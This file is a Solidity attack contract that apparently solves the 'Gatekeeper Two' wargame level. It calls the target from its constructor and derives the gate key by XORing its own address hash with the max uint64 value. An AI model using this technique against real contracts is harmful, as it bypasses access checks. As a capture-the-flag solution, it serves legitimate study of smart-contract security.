// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address target) {
        IGatekeeperTwo gate = IGatekeeperTwo(target);
        
        // This address is the attack contract (msg.sender)
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        gate.enter(key); // Called from constructor — passes gateTwo
    }
}
